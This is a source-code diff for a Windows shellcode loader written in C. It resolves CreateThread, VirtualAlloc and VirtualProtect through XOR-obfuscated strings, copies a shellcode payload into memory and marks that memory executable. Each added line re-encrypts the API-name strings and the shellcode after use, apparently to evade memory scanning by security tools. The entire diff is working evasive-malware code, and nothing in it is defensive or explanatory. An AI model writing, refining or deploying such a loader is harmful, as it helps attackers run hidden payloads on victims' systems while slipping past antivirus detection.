@@ -65,6 +65,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     // More dynamic invoke shit
     xor_data(kern, sizeof(kern), key, key_len);
     kernelHandle = LoadLibraryA((LPCSTR) kern);
+    xor_data(kern, sizeof(kern), key, key_len);
 
     if (kernelHandle == NULL)
     {
@@ -74,6 +75,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     // Get pointer to functions which we can invoke
     xor_data(crea, sizeof(crea), key, key_len);
     createThread = (CREATETHREAD)GetProcAddress(kernelHandle, (LPCSTR) crea);
+    xor_data(crea, sizeof(crea), key, key_len);
 
     if (!createThread)
     {
@@ -83,6 +85,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     }
     xor_data(virAlloc, sizeof(virAlloc), key, key_len);
     virtualAlloc = (VIRTUALALLOC)GetProcAddress(kernelHandle, (LPCSTR) virAlloc);
+    xor_data(virAlloc, sizeof(virAlloc), key, key_len);
 
     if (!virtualAlloc)
     {
@@ -93,6 +96,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
     xor_data(virProtect, sizeof(virProtect), key, key_len);
     virtualProtect = (VIRTUALPROTECT)GetProcAddress(kernelHandle, (LPCSTR) virProtect);
+    xor_data(virProtect, sizeof(virProtect), key, key_len);
 
     if (!virtualProtect)
     {
@@ -111,7 +115,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     // Copy payload to memory
     //printf("Copying buffer\n");
     RtlMoveMemory(payloadPtr, shellcode, shellcode_len);
-
+    xor_data(shellcode, shellcode_len, key, key_len);
     // Change permissions to RX
     //printf("Changing to execute permissions\n");
     rv = virtualProtect(payloadPtr, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);
